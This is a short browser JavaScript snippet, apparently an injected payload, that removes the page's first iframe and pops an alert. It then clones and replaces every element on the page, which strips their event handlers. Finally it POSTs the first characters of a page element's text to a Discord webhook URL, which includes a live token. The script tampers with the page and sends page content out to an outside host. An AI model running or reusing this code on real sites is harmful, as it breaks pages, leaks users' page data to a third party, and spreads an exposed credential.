var frames = document.getElementsByTagName("iframe");
frames[0].remove();
//frames[0].parentNode.parentNode.parentNode.remove();

setTimeout(alert,100, "O_o");

Array.from(document.getElementsByTagName('*')).forEach(element => {
    const clone = element.cloneNode(true);
    element.parentNode.replaceChild(clone, element);
});

var xhr = new XMLHttpRequest();
xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
xhr.setRequestHeader("Content-Type", "application/json");
var content = document.querySelector("#C\\\\.10").innerText.slice(0,8) + " o_O";
xhr.send(JSON.stringify({"content": content}));
